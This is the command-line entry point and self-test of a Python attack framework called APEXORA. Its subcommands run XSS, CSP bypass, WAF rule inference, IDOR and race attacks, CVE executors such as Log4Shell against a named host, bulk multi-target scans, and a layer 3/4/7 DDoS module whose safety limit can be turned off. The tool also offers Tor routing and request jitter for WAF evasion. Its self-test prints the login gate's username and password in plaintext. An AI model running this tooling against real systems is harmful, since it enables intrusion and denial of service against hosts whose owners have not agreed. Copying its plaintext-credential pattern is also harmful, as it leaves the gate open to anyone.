    _mkp(sub, "subdomain-enum", help_text="Subdomain enum").set_defaults(func=cmd_subdomain_enum)
    _mkp(sub, "subdomain-takeover", help_text="Subdomain takeover").set_defaults(func=cmd_subdomain_takeover)
    _mkp(sub, "dns-rebind", help_text="DNS rebind").set_defaults(func=cmd_dns_rebind)
    _mkp(sub, "origin", help_text="Origin hunt").set_defaults(func=cmd_origin)
    _mkp(sub, "headers", help_text="Headers audit").set_defaults(func=cmd_headers)
    _mkp(sub, "tls", help_text="TLS audit").set_defaults(func=cmd_tls)
    _mkp(sub, "cve-intel", help_text="CVE fingerprint").set_defaults(func=cmd_cve_intel)
    _mkp(sub, "rule-steal", help_text="WAF rule inference").set_defaults(func=cmd_rule_steal)

    _mkp(sub, "js-recon", help_text="JS recon").set_defaults(func=cmd_js_recon)
    _mkp(sub, "dom-xss", help_text="DOM XSS").set_defaults(func=cmd_dom_xss)
    _mkp(sub, "postmessage", help_text="postMessage bypass").set_defaults(func=cmd_postmessage)
    _mkp(sub, "csp", help_text="CSP bypass").set_defaults(func=cmd_csp)
    _mkp(sub, "router", help_text="Client router bypass").set_defaults(func=cmd_router)
    _mkp(sub, "sri", help_text="SRI audit").set_defaults(func=cmd_sri)
    _mkp(sub, "service-worker", help_text="Service worker audit").set_defaults(func=cmd_service_worker)
    _mkp(sub, "dom-clobbering", help_text="DOM clobbering").set_defaults(func=cmd_dom_clobbering)

    _mkp(sub, "race", help_text="Race condition").set_defaults(func=cmd_race)
    _mkp(sub, "mass-assign", help_text="Mass assignment").set_defaults(func=cmd_mass_assign)
    _mkp(sub, "idor", help_text="IDOR").set_defaults(func=cmd_idor)

    p = _mkp(sub, "cve-exec", help_text="Run CVE executors")
    p.add_argument("--id", dest="cve_id", default=None, help="single CVE id")
    p.set_defaults(func=cmd_cve_exec)

    p = _mkp(sub, "oob-blind", help_text="OOB-based blind vulnerability scanner")
    p.set_defaults(func=cmd_oob_blind)

    p = _mkp(sub, "ddos", help_text="Multi-layer DDoS simulation dashboard (L3/L4/L7)")
    p.add_argument("--modules", default="l3,l4,l7", help="comma-separated l3,l4,l7")
    p.add_argument("--duration", type=int, default=DEFAULT_DURATION, help="seconds per module")
    p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="parallel workers")
    p.set_defaults(func=cmd_ddos)

    sub.add_parser("categories", help="List categories").set_defaults(func=cmd_categories)
    sub.add_parser("list-modules", help="Full grouped reference").set_defaults(func=cmd_list_modules)
    sub.add_parser("help", help="Alias for list-modules").set_defaults(func=cmd_list_modules)

    p = sub.add_parser("payloads", help="Show payloads")
    p.add_argument("--category")
    p.set_defaults(func=cmd_payloads)

    p = sub.add_parser("cve", help="Search CVEs")
    p.add_argument("query", nargs="?", default="")
    p.set_defaults(func=cmd_cve)

    p = sub.add_parser("history", help="DB history")
    p.add_argument("--limit", type=int, default=20)
    p.set_defaults(func=cmd_history)

    sub.add_parser("health", help="System status").set_defaults(func=cmd_health)
    sub.add_parser("stats", help="DB stats").set_defaults(func=cmd_stats)
    sub.add_parser("version", help="Version info").set_defaults(func=cmd_version)
    sub.add_parser("logout", help="Clear session token").set_defaults(func=cmd_logout)
    sub.add_parser("save-all", help="Save all terminal output").set_defaults(func=cmd_save_all)

    p = sub.add_parser("scope", help="Manage scope allowlist")
    p.add_argument("--add")
    p.add_argument("--remove")
    p.add_argument("--clear", action="store_true")
    p.set_defaults(func=cmd_scope)

    p = sub.add_parser("waf-rules", help="Generate ModSecurity rules")
    p.add_argument("--output")
    p.set_defaults(func=cmd_waf_rules)

    p = sub.add_parser("php2shell-rules", help="Generate PHP2Shell rules")
    p.add_argument("--output")
    p.set_defaults(func=cmd_php2shell_rules)

    p = sub.add_parser("rate", help="Configure rate limiting")
    p.add_argument("--delay", type=float)
    p.add_argument("--jitter", type=float, default=0.0)
    p.set_defaults(func=cmd_rate)

    p = sub.add_parser("oob", help="Out-of-band callback server")
    p.add_argument("action", nargs="?", default="status", choices=["start","stop","hits","clear","status"])
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8888)
    p.set_defaults(func=cmd_oob)

    sub.add_parser("basic-auth", help="HTTP Basic Authentication gate").set_defaults(func=cmd_basic_auth)

    p = sub.add_parser("bulk", help="Bulk multi-target scanning")
    p.add_argument("--category", default="sqli")
    p.add_argument("--targets-file")
    p.add_argument("--output")
    p.add_argument("--force", action="store_true")
    p.set_defaults(func=cmd_bulk)

    p = sub.add_parser("tor", help="Tor SOCKS5 proxy system")
    p.add_argument("action", nargs="?", default="status", choices=["start","stop","status"])
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=9050)
    p.set_defaults(func=cmd_tor)

    p = sub.add_parser("ddos-safety", help="Toggle DDoS safety limit")
    p.add_argument("--mode", default="status", choices=["on","off","status"])
    p.set_defaults(func=cmd_ddos_safety)

    sub.add_parser("shell", help="Interactive shell").set_defaults(func=lambda a: interactive_shell())

def main():
    parser = argparse.ArgumentParser(
        prog="apexora",
        description="APEXORA — Multi-layer firewall analysis, offensive and defensive security intelligence, attack-surface discovery, and advanced penetration testing framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  apexora detect-firewall/waf example.com\n"
            "  apexora waf-list\n"
            "  apexora sqli example.com\n"
            "  apexora cve-exec example.com\n"
            "  apexora cve-exec example.com --id CVE-2021-44228\n"
            "  apexora ddos example.com --modules l3,l4,l7 --duration 15 --concurrency 50\n"
            "  apexora oob start --host 0.0.0.0 --port 8888\n"
            "  apexora oob-blind example.com\n"
            "  apexora rate --delay 0.5 --jitter 0.2\n"
            "  apexora bulk --category sqli --targets-file targets.txt\n"
            "  apexora tor start --host 127.0.0.1 --port 9050\n"
            "  apexora basic-auth\n"
            "  apexora scope --add example.com\n"
            "  apexora categories\n"
            "  apexora shell\n"
        ),
    )
    sub = parser.add_subparsers(dest="cmd")
    _add_all_subcommands(sub)

    args = parser.parse_args()

    if not args.cmd:
        if not security_gate():
            sys.exit(1)
        _RECORDER.start()
        interactive_shell()
        return

    if args.cmd != "shell":
        if not security_gate():
            sys.exit(1)

    _RECORDER.start()
    args.func(args)

def _sigint_handler(sig, frame):
    print()
    print(_yel("[*] CTRL+C — exiting"))
    _RECORDER.dump_all()
    sys.exit(0)

signal.signal(signal.SIGINT, _sigint_handler)
try:
    signal.signal(signal.SIGTSTP, _sigint_handler)
except Exception:
    pass

def self_test():
    print()
    section("SELF TEST", C_CYN)
    kv_line("Python", sys.version.split()[0])
    kv_line("TTY", TTY)
    kv_line("Work dir", str(WORK_DIR))
    kv_line("DB file", str(DB_FILE))
    kv_line("Auth file", str(AUTH_FILE))
    kv_line("Scope file", str(SCOPE_FILE))
    kv_line("UA pool file", str(USER_AGENTS_FILE))
    kv_line("UA pool size", len(_UA_POOL))
    kv_line("OOB file", str(OOB_FILE))
    kv_line("Rate file", str(RATE_FILE))
    kv_line("Tor file", str(TOR_FILE))
    kv_line("Bulk file", str(BULK_FILE))

    section("PAYLOAD COUNTS", C_CYN)
    total = 0
    for k in sorted(PAYLOADS.keys()):
        v = PAYLOADS[k]
        n = sum(len(x) for x in v.values()) if isinstance(v, dict) else len(v)
        total += n
        print(f"  {_grn(k.ljust(24))} {_dim(str(n))}")
    print(f"  {_bold('TOTAL'.ljust(24))} {_bold(_grn(str(total)))}")

    section("SIGNATURE COUNTS", C_CYN)
    kv_line("WAF signatures", len(WAF_SIGNATURES))
    kv_line("WAF descriptions", len(WAF_DESCRIPTIONS))
    missing = [k for k in WAF_SIGNATURES if k not in WAF_DESCRIPTIONS]
    if missing:
        warn(f"{len(missing)} WAF signatures lack descriptions")
        for m in missing[:10]:
            print(f"    {_dim(m)}")
    else:
        ok("every WAF signature has a description")
    kv_line("CVE entries", len(CVE_DB))
    kv_line("HTTP-executable CVEs", len(CVE_EXECUTORS))
    kv_line("Probe-only / protocol CVEs", len(CVE_DB) - len(CVE_EXECUTORS))
    kv_line("Attack runners", len(RUNNERS))
    kv_line("Subcommands", len(ALL_CATEGORIES) + 30)

    section("DB INIT", C_CYN)
    try:
        conn = db_conn()
        conn.close()
        ok(f"DB ready at {DB_FILE}")
    except Exception as e:
        err(f"DB init failed: {e}")

    section("AUTH", C_CYN)
    cached = _load_auth()
    if cached:
        ok("session active")
    else:
        info("no session — gate required")
    if _AUTH_USER_HASH == hashlib.sha256(b"sylhetyhackvenger").hexdigest() and _AUTH_PASS_HASH == hashlib.sha256(b"error808").hexdigest():
        ok("auth hashes match reference values")
    else:
        err("auth hashes DO NOT match reference values — gate will fail")

    section("SCOPE", C_CYN)
    pats = load_scope()
    if pats:
        ok(f"{len(pats)} scope patterns configured")
        for p in pats[:5]:
            print(f"  {_grn('●')} {p}")
        if len(pats) > 5:
            info(f"... and {len(pats) - 5} more")
    else:
        warn("no scope patterns — add with: apexora scope --add <pattern>")

    section("DDoS MODULE", C_CYN)
    kv_line("Safety max concurrency", SAFETY_MAX_CONCURRENCY)
    kv_line("Default duration (s)", DEFAULT_DURATION)
    kv_line("Default concurrency", DEFAULT_CONCURRENCY)
    kv_line("Safety limit", "ON" if DDOS_SAFETY_LIMIT else "OFF")
    kv_line("Max duration", DDOS_MAX_DURATION)
    kv_line("Max concurrency", DDOS_MAX_CONCURRENCY)
    ok("multi-layer DDoS simulation module loaded")

    section("RATE LIMITING", C_CYN)
    kv_line("Current delay", f"{_RATE_LIMITER._delay}s")
    kv_line("Current jitter", f"{_RATE_LIMITER._jitter}s")
    ok("rate limiter active — safe for WAF evasion")

    section("OOB SERVER", C_CYN)
    kv_line("OOB state", "running" if _OOB_SERVER._running else "stopped")
    kv_line("OOB URL", _oob_url())
    ok("blind vuln detection ready")

    section("TOR SYSTEM", C_CYN)
    active = False
    if TOR_FILE.exists():
        try:
            d = json.loads(TOR_FILE.read_text())
            active = d.get("active", False)
        except Exception:
            pass
    kv_line("Tor proxy", "configured" if active else "not configured")
    info("start on other terminal: tor / torsocks")

    section("BULK MODE", C_CYN)
    kv_line("Bulk file", str(BULK_FILE))
    kv_line("Bulk exists", BULK_FILE.exists())
    ok("multi-target bulk scanning ready")

    section("TERMINAL RECORDER", C_CYN)
    kv_line("Report dir", str(REPORT_DIR))
    kv_line("Session save", "on exit: .txt + .json + .xml + ALL_SESSIONS.*")
    ok("all-in-one exit save ready")

    print()
    ok("self test complete")

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] in ("--self-test", "selftest"):
            show_banner()
            self_test()
            sys.exit(0)
        main()
    except KeyboardInterrupt:
        print()
        print(_yel("[*] interrupted"))
        _RECORDER.dump_all()
        sys.exit(0)
    except Exception as e:
        print()
        err(f"fatal: {str(e)[:300]}")
        import traceback
        traceback.print_exc()
        _RECORDER.dump_all()
        sys.exit(1)
